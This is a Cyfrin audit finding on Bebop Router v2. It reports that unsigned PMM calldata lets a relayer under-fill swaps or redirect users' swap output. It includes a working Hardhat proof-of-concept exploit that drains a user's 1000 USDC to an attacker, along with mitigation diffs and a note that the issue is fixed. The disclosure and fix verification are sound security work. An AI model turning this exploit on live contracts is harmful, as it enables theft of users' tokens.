---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-12-cyfrin-bebop-router-v2-0-0-0
ingested_at: '2026-08-30T10:05:51Z'
protocol_category: []
published_at: '2026-06-12T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-12-cyfrin-bebop-router-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-12-cyfrin-bebop-router-v2-0
title: '`BebopRouter::settle` lets relayers steal `exactIn` user input by substituting
  unbound PMM calldata that under-delivers or redirects output'
vuln_class: []
---

# `BebopRouter::settle` lets relayers steal `exactIn` user input by substituting unbound PMM calldata that under-delivers or redirects output

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-12-cyfrin-bebop-router-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-12-cyfrin-bebop-router-v2.0.md)_

---

**Description:** In the gasless `BebopRouter::settle` flow, the user authorizes the router to pull a bounded amount of input tokens, but the relayer supplies the raw PMM calldata that determines how much output the maker delivers and where that output is sent.

The router checks the `routerSigner` signature and the user signature over `order.hash(...)`, but that hash commits only to the router order fields and **not** to the `bebopPmmCalldata` bytes:

```solidity
// BebopRouterOrderLib.sol:49 — only the 14 order fields + extraInfoHash + hooksHash are hashed
calldatacopy(add(m, 0x20), order, 0x1c0)   // fromAmount .. routerNonce ; bebopPmmCalldata NOT included
```

`BebopPmmHelper::_validateAndExtractPmmInfo` then validates only the PMM selector, token identity, and non-zero amounts. It does **not** require the PMM `maker_amount` to match the signed router quote (`toAmount`), the PMM `receiver` to be the router, or the delivery form to be plain ERC-20 rather than native ETH:

```solidity
// BebopPmmHelper.sol:62-76  _decodeSinglePmm — receiver and packed_commands decoded then discarded
( , , address maker_address, uint256 maker_nonce,
  address taker_token, address maker_token,
  uint256 taker_amount, uint256 maker_amount,
  , // receiver            // @audit not required == address(this)
  , // packed_commands      // @audit native-delivery flags ignored
  uint256 pmmFlags ) = abi.decode(pmmCalldata[4:4+352], (...));
require(taker_token == expectedFromToken && maker_token == expectedToToken, TokenMismatch()); // @audit only identity, not amount/receiver check
require(taker_amount > 0 && maker_amount > 0, UnexpectedAmount());                            // @audit only non-zero check
```

[`BebopSettlement`](https://etherscan.io/address/0xbbbbbBB520d69a9775E85b458C58c648259FAD5F#code) transfers exactly the maker-signed `maker_amount` to the maker-signed `receiver`.

```solidity
// BebopSettlement::_executeSingleOrder: Line 286-291
    uint256 newMakerAmount = updatedMakerAmount;
        if (filledTakerAmount != 0 && filledTakerAmount < order.taker_amount){
            newMakerAmount = (updatedMakerAmount * filledTakerAmount) / order.taker_amount;
        }
        (bool makerUsingPermit2, ) = Signature.extractMakerFlags(makerSignature.flags);
        _transferToken( // @audit transfer here
            order.maker_address, order.receiver, order.maker_token, newMakerAmount,
            makerUsingPermit2 ? Commands.PERMIT2_TRANSFER : Commands.SIMPLE_TRANSFER,
            makerHasNative ? Transfer.Action.Unwrap : Transfer.Action.None, partnerId
        );

```


For an **exactIn `settle` order with `limitAmount == 0`** (allowed — `settle:205` only requires `limitAmount < 0` for exactOut), the router also enforces no minimum on the receiver's final output:

```solidity
// BebopRouter.sol:: _executeSwapCore Line305-308 (exactIn ⇒ isExactOut == false)
receiverAmount = IERC20(order.toToken).balanceOf(address(this));
require(!ctx.calc.isExactOut || receiverAmount >= ctx.calc.toAmountAfterFeeSlippage, LimitAmountViolation()); // @audit skipped for exactIn
require(order.limitAmount <= 0 || receiverAmount >= uint256(order.limitAmount), LimitAmountViolation());      // @audit limitAmount==0 ⇒ 0<=0 ⇒ no floor
```
This creates a mismatch: the signed router order authorizes the user input pull, while the unsigned PMM calldata controls the realized output. A malicious relayer can exploit that mismatch in three equivalent ways:

1. **Under-fill (receiver == router):** `taker_amount = newFromAmount`, `maker_amount = dust`. The PMM sends dust to the router; `_distributeFees` sees `feePool == 0`; the payout delivers the dust to the user.
2. **Receiver redirect:** PMM `receiver = attacker` → maker output goes to the attacker; router balance is `0`; user gets `0`.
3. **Native delivery:** `packed_commands.makerHasNative` → ETH is delivered instead of `pmmToToken`; WETH accounting reads `0`, so ERC-20-output users receive `0` and native-output orders bypass the fee accounting.

**Impact:** Direct theft of a gasless-`settle` user's authorized input. In the PoC shown, the user is debited the full `1000 USDC` they authorized and receives either `0 WETH` (redirect / native) or `1 wei WETH` (under-fill), versus the quote-implied `~0.5 WETH` — effectively a total loss of the swap. No protocol-side privilege is required.

The attacker is the relayer submitting the gasless order. The maker requirement depends on the vector: the redirect vector needs only a maker quote whose PMM `receiver` is the relayer, while the under-fill vector requires a colluding or self-controlled maker signing a toxic-rate quote (`maker_amount = dust`). The trigger is any `exactIn` `settle` order signed with `limitAmount == 0`.


**Proof of Concept:** Add the test to `poc.test.ts` in `test/audit` folder and run the following:

`npx hardhat test test/audit/poc.test.ts --config hardhat.config.ts`

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { WETH, USDC, e6, e18 } from "../test-configs";

const BEBOP_PMM = "0xbbbbbBB520d69a9775E85b458C58c648259FAD5F";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const PMM_DOMAIN_NAME = "BebopSettlement";
const PMM_DOMAIN_VERSION = "2";
const ROUTER_DOMAIN_NAME = "BebopRouter";
const ROUTER_DOMAIN_VERSION = "1";
const USDC_SLOT = 9n;

interface PmmSingleOrder {
  expiry: bigint; taker_address: string; maker_address: string; maker_nonce: bigint;
  taker_token: string; maker_token: string; taker_amount: bigint; maker_amount: bigint;
  receiver: string; packed_commands: bigint; flags: bigint;
}
interface RouterOrder {
  fromAmount: bigint; toAmount: bigint; limitAmount: bigint;
  fromToken: string; toToken: string; pmmFromToken: string; pmmToToken: string;
  tokensOwner: string; receiver: string; originAddress: string;
  oracle: string; checker: string; info: bigint; routerNonce: bigint; unsignedFlags: bigint;
}

function packInfo(expiry: bigint): bigint { return (expiry << 64n); }

async function signRouterOrder(signer: SignerWithAddress, verifyingContract: string, chainId: bigint, order: RouterOrder, extraInfo: string, hooksHash: string) {
  return signer.signTypedData(
    { name: ROUTER_DOMAIN_NAME, version: ROUTER_DOMAIN_VERSION, chainId, verifyingContract },
    { BebopRouterOrder: [
      { name: "fromAmount", type: "uint256" }, { name: "toAmount", type: "uint256" },
      { name: "limitAmount", type: "int256" }, { name: "fromToken", type: "address" },
      { name: "toToken", type: "address" }, { name: "pmmFromToken", type: "address" },
      { name: "pmmToToken", type: "address" }, { name: "tokensOwner", type: "address" },
      { name: "receiver", type: "address" }, { name: "originAddress", type: "address" },
      { name: "oracle", type: "address" }, { name: "checker", type: "address" },
      { name: "info", type: "uint256" }, { name: "routerNonce", type: "uint256" },
      { name: "extraInfoHash", type: "bytes32" }, { name: "hooksHash", type: "bytes32" },
    ]},
    { ...order, extraInfoHash: ethers.keccak256(extraInfo), hooksHash }
  );
}
async function signPmmSingleOrder(signer: SignerWithAddress, pmmAddress: string, chainId: bigint, order: PmmSingleOrder, partnerId: bigint) {
  return signer.signTypedData(
    { name: PMM_DOMAIN_NAME, version: PMM_DOMAIN_VERSION, chainId, verifyingContract: pmmAddress },
    { SingleOrder: [
      { name: "partner_id", type: "uint64" }, { name: "expiry", type: "uint256" },
      { name: "taker_address", type: "address" }, { name: "maker_address", type: "address" },
      { name: "maker_nonce", type: "uint256" }, { name: "taker_token", type: "address" },
      { name: "maker_token", type: "address" }, { name: "taker_amount", type: "uint256" },
      { name: "maker_amount", type: "uint256" }, { name: "receiver", type: "address" },
      { name: "packed_commands", type: "uint256" },
    ]},
    { partner_id: partnerId, ...order }
  );
}
function encodePmmSwapSingle(order: PmmSingleOrder, makerSig: string, filledTakerAmount: bigint) {
  const iface = new ethers.Interface([
    "function swapSingle(tuple(uint256,address,address,uint256,address,address,uint256,uint256,address,uint256,uint256) order, tuple(bytes,uint256) makerSignature, uint256 filledTakerAmount)"
  ]);
  return iface.encodeFunctionData("swapSingle", [
    [order.expiry, order.taker_address, order.maker_address, order.maker_nonce, order.taker_token, order.maker_token, order.taker_amount, order.maker_amount, order.receiver, order.packed_commands, order.flags],
    [makerSig, 0n], filledTakerAmount
  ]);
}
async function fundUsdc(to: string, amount: bigint) {
  const slot = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [to, USDC_SLOT]));
  await ethers.provider.send("hardhat_setStorageAt", [USDC, slot, ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [amount])]);
}
async function fundWeth(signer: SignerWithAddress, amount: bigint) {
  await signer.sendTransaction({ to: WETH, value: amount, data: "0xd0e30db0" }); // deposit()
}

describe("Audit PoCs", function () {
  this.timeout(300000);
  let router: any, chainId: bigint, routerAddr: string;
  let owner: SignerWithAddress, routerSigner: SignerWithAddress, user: SignerWithAddress;
  let treasury: SignerWithAddress, maker: SignerWithAddress, attacker: SignerWithAddress;
  let usdc: any, weth: any;
  let nonce = 1000n;

  before(async () => {
    const s = await ethers.getSigners();
    [owner, routerSigner, user, treasury, , maker, , , , , attacker] = s;
    maker = s[5]; attacker = s[10];
    chainId = (await ethers.provider.getNetwork()).chainId;
    router = await (await ethers.getContractFactory("BebopRouter")).deploy(treasury.address, routerSigner.address, BEBOP_PMM, PERMIT2, WETH);
    await router.waitForDeployment();
    routerAddr = await router.getAddress();
    usdc = await ethers.getContractAt("IERC20", USDC);
    weth = await ethers.getContractAt("IERC20", WETH);
  });

  it("relayer redirects maker output to attacker; user pays, gets 0", async () => {
    const expiry = BigInt(Math.floor(Date.now() / 1000) + 3600);
    const routerNonce = nonce++, makerNonce = nonce++;
    const order: RouterOrder = {
      fromAmount: e6(1000), toAmount: e18("0.5"), limitAmount: 0n, // @audit no min-out floor
      fromToken: USDC, toToken: WETH, pmmFromToken: USDC, pmmToToken: WETH,
      tokensOwner: user.address, receiver: user.address,
      originAddress: ethers.ZeroAddress, oracle: ethers.ZeroAddress, checker: ethers.ZeroAddress,
      info: packInfo(expiry), routerNonce, unsignedFlags: 0n,
    };
    // user funds + approves router (EIP-712 settle pull path)
    await fundUsdc(user.address, e6(1000));
    await usdc.connect(user).approve(routerAddr, e6(1000));
    // maker funds WETH, approves PMM; signs a PMM order with receiver = ATTACKER
    await fundWeth(maker, e18("0.5"));
    await weth.connect(maker).approve(BEBOP_PMM, ethers.MaxUint256);
    const pmm: PmmSingleOrder = {
      expiry, taker_address: routerAddr, maker_address: maker.address, maker_nonce: makerNonce,
      taker_token: USDC, maker_token: WETH, taker_amount: e6(1000), maker_amount: e18("0.5"),
      receiver: attacker.address, packed_commands: 0n, flags: 0n, // @audit redirected
    };
    const makerSig = await signPmmSingleOrder(maker, BEBOP_PMM, chainId, pmm, 0n);
    const pmmCalldata = encodePmmSwapSingle(pmm, makerSig, 0n);
    const routerSig = await signRouterOrder(routerSigner, routerAddr, chainId, order, "0x", ethers.ZeroHash);
    const userSig = await signRouterOrder(user, routerAddr, chainId, order, "0x", ethers.ZeroHash);

    const userUsdc0 = await usdc.balanceOf(user.address);
    const userWeth0 = await weth.balanceOf(user.address);
    const attkWeth0 = await weth.balanceOf(attacker.address);

    // relayer (owner) submits
    await router.connect(owner).settle(e6(1000), order, "0x", routerSig, pmmCalldata, [], userSig);

    const userUsdcSpent = userUsdc0 - (await usdc.balanceOf(user.address));
    const userWethGain = (await weth.balanceOf(user.address)) - userWeth0;
    const attkWethGain = (await weth.balanceOf(attacker.address)) - attkWeth0;

    expect(userUsdcSpent).to.equal(e6(1000));   // user debited
    expect(userWethGain).to.equal(0n);          // user receives nothing
    expect(attkWethGain).to.equal(e18("0.5"));  // attacker receives the output
  });
});
```

**Recommended Mitigation:** The root cause is that the externally-supplied PMM fill is unconstrained and `exactIn` orders without a floor are unprotected.

Consider enforcing a minimum delivered output for `exactIn`, the same way `exactOut` already does. The contract already computes the quote-implied net (`toAmountAfterFeeSlippage`) and already checks it for exactOut — it is simply skipped for exactIn (the `!ctx.calc.isExactOut ||` short-circuit). Remove that gate so the floor always applies (the same one-line change in both payout branches, `BebopRouter.sol:301` native and `:306` ERC-20):

```diff
- require(!ctx.calc.isExactOut || receiverAmount >= ctx.calc.toAmountAfterFeeSlippage, LimitAmountViolation());
+ require(receiverAmount >= ctx.calc.toAmountAfterFeeSlippage, LimitAmountViolation());
```

Also, force PMM output to arrive at the router in the expected asset form. For a native-output order (`toToken == NATIVE_TOKEN`) filled with `makerHasNative`, ETH delivery can satisfy the payout floor while `_distributeFees` still reads `WETH.balanceOf(address(this)) == 0`. Decode and validate the PMM receiver and command bits before the external settlement call:

```diff
  require(taker_token == expectedFromToken && maker_token == expectedToToken, TokenMismatch());
  require(taker_amount > 0 && maker_amount > 0, UnexpectedAmount());
+ require(receiver == address(this), InvalidPmmReceiver());
+ require((packed_commands & 0x07) == 0, UnsupportedPmmCommand());
```

Apply equivalent validation to the aggregate PMM path. If native maker delivery must be supported, `_distributeFees` should account from the router's native-balance delta instead of using only the WETH balance.

**Bebop:** Fixed in commit [9db95bc](https://github.com/bebop-dex/bebop-rfqa/commit/9db95bc2b423d9317c149e90a70ae51565e26367).

**Cyfrin:**
Verified.

\clearpage
